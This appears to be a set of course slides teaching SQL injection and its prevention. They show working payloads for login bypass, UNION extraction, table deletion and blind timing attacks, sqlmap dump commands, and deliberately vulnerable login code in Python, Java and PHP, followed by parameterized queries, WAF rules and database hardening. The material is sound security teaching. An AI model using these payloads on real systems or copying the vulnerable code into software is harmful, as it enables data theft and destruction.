# SQL Injection
---
## What is SQL Injection?
- A technique to exploit web applications by injecting malicious SQL statements
- Attacker can gain unauthorized access to databases
- Can lead to data theft, data manipulation, or even server takeover
- Consistently ranked #1 or top 3 in OWASP Top 10 since 2003
---
## How Does SQL Injection Work?

![how_does_sql_injection_work](svg/courses/security/cyber-attacks-and-vectors/06_sql_injection/how_does_sql_injection_work.svg)

---
## How Does SQL Injection Work?
1. User input is not properly sanitized
1. Malicious SQL code is injected into application queries
1. Injected code is executed by the database
1. Attacker can retrieve, modify, or delete data

---
## Types of SQL Injection

| Type          | Description                                  | Visibility |
|---------------|----------------------------------------------|------------|
| In-band       | Results returned directly in response        | High       |
| Error-based   | Database errors reveal information           | Medium     |
| UNION-based   | UNION queries extract additional data        | High       |
| Blind Boolean | True/false responses infer data              | Low        |
| Blind Time    | Response timing reveals data                 | Low        |
| Out-of-band   | Data sent via DNS/HTTP to attacker server    | None       |

---
## Examples of SQL Injection
- Login bypass: `' OR '1'='1`
- Retrieving data: `UNION SELECT password FROM users`
- Adding data: `'; INSERT INTO users VALUES ('admin', 'password')`
- Deleting data: `'; DROP TABLE users; --`

---
## Step-by-Step: Authentication Bypass

```sql
-- Application code builds this query:
SELECT * FROM users WHERE username='INPUT' AND password='INPUT';

-- Attacker enters username: admin' --
-- Resulting query:
SELECT * FROM users WHERE username='admin' --' AND password='';
-- The -- comments out the password check!
-- Attacker logs in as admin without knowing the password.

-- Attacker enters username: ' OR 1=1 --
-- Resulting query:
SELECT * FROM users WHERE username='' OR 1=1 --' AND password='';
-- Returns ALL users - attacker gets the first row (often admin)
```

---
## Step-by-Step: UNION-Based Data Extraction

```sql
-- Original query:
SELECT name, price FROM products WHERE id=INPUT;

-- Step 1: Determine number of columns
' ORDER BY 1 --     (works)
' ORDER BY 2 --     (works)
' ORDER BY 3 --     (error - only 2 columns)

-- Step 2: Find displayable columns
' UNION SELECT 'test1', 'test2' --

-- Step 3: Extract database metadata
' UNION SELECT table_name, NULL FROM information_schema.tables --

-- Step 4: Extract column names
' UNION SELECT column_name, NULL
  FROM information_schema.columns
  WHERE table_name='users' --

-- Step 5: Extract actual data
' UNION SELECT username, password FROM users --
```

---
## Blind SQL Injection: Boolean-Based

When the application does not show query results but behaves differently for true/false:

```sql
-- Test if first character of admin password is 'a'
' AND (SELECT SUBSTRING(password,1,1)
       FROM users WHERE username='admin') = 'a' --

-- If the page loads normally: character is 'a'
-- If the page shows error/empty: character is not 'a'

-- Automated extraction character by character:
-- Position 1: test a,b,c,...z,0-9 -> found 'p'
-- Position 2: test a,b,c,...z,0-9 -> found 'a'
-- Position 3: test a,b,c,...z,0-9 -> found 's'
-- ... eventually: password = 'pa$$w0rd'
```

This is slow but fully automated by tools like sqlmap.

---
## Blind SQL Injection: Time-Based

When there is no visible difference in response:

```sql
-- MySQL: IF condition is true, sleep 5 seconds
' AND IF(1=1, SLEEP(5), 0) --
-- If response takes ~5 seconds: injection works!

-- Extract data using timing:
' AND IF(
    (SELECT SUBSTRING(password,1,1)
     FROM users WHERE username='admin') = 'a',
    SLEEP(5), 0) --
-- 5 second delay = character is 'a'
-- Instant response = character is not 'a'

-- PostgreSQL equivalent:
' AND (SELECT CASE WHEN (1=1)
       THEN pg_sleep(5) ELSE pg_sleep(0) END) --
```

---
## Second-Order SQL Injection

![second_order_sql_injection](svg/courses/security/cyber-attacks-and-vectors/06_sql_injection/second_order_sql_injection.svg)

---
## Vulnerable Code: Multiple Languages

### Python (Flask + SQLite)

```python
# VULNERABLE: String concatenation
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    user = db.execute(query).fetchone()
    if user:
        session['user'] = user['username']
        return redirect('/dashboard')
    return 'Invalid credentials'
```

### Java (JDBC)

```java
// VULNERABLE: String concatenation in JDBC
String query = "SELECT * FROM users WHERE username='"
    + username + "' AND password='" + password + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

### PHP

```php
// VULNERABLE: Direct variable interpolation
$query = "SELECT * FROM users WHERE username='$username'
          AND password='$password'";
$result = mysqli_query($conn, $query);
```

---
## Preventing SQL Injection
1. **Input Validation**: Validate and sanitize user input
1. **Parameterized Queries**: Use parameterized queries or prepared statements
1. **Least Privileged Accounts**: Use database accounts with minimal privileges
1. **Web Application Firewalls (WAF)**: Deploy a WAF to filter malicious input
1. **Security Updates**: Keep your software and libraries up-to-date
---
## Parameterized Queries

```python
# Insecure query
query = "SELECT * FROM users WHERE name = '" + username + "';"

# Secure parameterized query
query = "SELECT * FROM users WHERE name = ?;"
cursor.execute(query, (username,))
```

---
## Parameterized Queries: All Languages

### Python (SQLAlchemy ORM - recommended)
```python
# Using ORM - no raw SQL at all
user = User.query.filter_by(username=username).first()

# Using SQLAlchemy text with parameters
from sqlalchemy import text
result = db.execute(
    text("SELECT * FROM users WHERE username = :name"),
    {"name": username}
)
```

### Java (Prepared Statement)
```java
String query = "SELECT * FROM users WHERE username=? AND password=?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

### PHP (PDO)
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :user AND password = :pass");
$stmt->execute(['user' => $username, 'pass' => $password]);
$user = $stmt->fetch();
```

### Node.js (pg library)
```javascript
const query = 'SELECT * FROM users WHERE username = $1 AND password = $2';
const result = await pool.query(query, [username, password]);
```

---
## Stored Procedures (Additional Defense Layer)

```sql
-- Create a stored procedure for login
CREATE PROCEDURE sp_authenticate(
    IN p_username VARCHAR(50),
    IN p_password VARCHAR(255)
)
BEGIN
    SELECT user_id, username, role
    FROM users
    WHERE username = p_username
    AND password_hash = SHA2(p_password, 256);
END;

-- Call from application (still use parameterized!)
-- cursor.callproc('sp_authenticate', (username, password))
```

Note: Stored procedures alone do not prevent SQLi if they use dynamic SQL internally.

---
## Sanitizing User Input
- Remove or escape special characters (', ", `, etc.)
- Use allowlists (whitelisting) instead of denylists (blacklisting)
- Apply strong input validation rules
- Avoid interpreting input as executable code

---
## Real-World SQL Injection Incidents

| Incident             | Year | Impact                                 |
|---------------------|------|----------------------------------------|
| Heartland Payment   | 2008 | 134 million credit cards stolen         |
| Sony PlayStation    | 2011 | 77 million accounts compromised        |
| Yahoo               | 2012 | 450,000 credentials leaked             |
| TalkTalk            | 2015 | 157,000 customer records, 60M GBP fine |
| Equifax             | 2017 | 147 million records (via Struts vuln)  |

---
## Detection and Testing Tools

```bash
# sqlmap - Automated SQL injection detection and exploitation
# (for authorized penetration testing only)
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# OWASP ZAP - Web application scanner
# Includes SQL injection detection rules

# Burp Suite - Intercept and modify requests
# Use Intruder with SQLi payload lists

# Static analysis
# Python: bandit -r myapp/
# Java: FindBugs / SpotBugs with FindSecBugs plugin
# PHP: phpcs with security-audit standard
```

---
## WAF Rules for SQL Injection

```sql
# ModSecurity CRS rules for SQL injection detection
# Common patterns blocked:
# - UNION SELECT
# - OR 1=1
# - Single quotes followed by SQL keywords
# - Comment sequences (-- or /*)
# - Hex-encoded SQL keywords

# Example custom rule:
SecRule ARGS "@detectSQLi" \
    "id:1002,\
    phase:2,\
    deny,\
    status:403,\
    log,\
    msg:'SQL Injection Attempt Detected'"
```

---
## Database Hardening

```sql
-- Create application-specific database user with minimal privileges
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';

-- Grant only necessary permissions
GRANT SELECT, INSERT, UPDATE ON myapp.users TO 'webapp'@'localhost';
GRANT SELECT ON myapp.products TO 'webapp'@'localhost';

-- NEVER grant these to application accounts:
-- GRANT ALL PRIVILEGES
-- GRANT FILE (allows reading server files)
-- GRANT PROCESS (allows seeing other queries)
-- GRANT SUPER (allows killing queries, changing config)

-- Disable dangerous functions
-- MySQL: SET GLOBAL local_infile = 0;
-- PostgreSQL: Restrict pg_read_file, pg_ls_dir
```

---
## Best Practices
- Follow the principle of "least privilege" for database accounts
- Implement secure authentication and access control mechanisms
- Keep software up-to-date with security patches and updates
- Regularly audit and test your applications for SQL Injection vulnerabilities
- Educate developers on secure coding practices and SQL Injection prevention

---
## Exercise: SQL Injection Lab

1. Set up a vulnerable login form using Flask + SQLite
1. Demonstrate these attack types:
   - Authentication bypass with `' OR 1=1 --`
   - UNION-based extraction of all usernames and passwords
   - Time-based blind injection to extract the admin password character by character
1. Use sqlmap to automate the extraction
1. Fix the application using parameterized queries
1. Add a WAF layer and test that previous attacks are blocked
1. Implement database-level hardening (least privilege user)
1. Compare the before/after security with OWASP ZAP scans
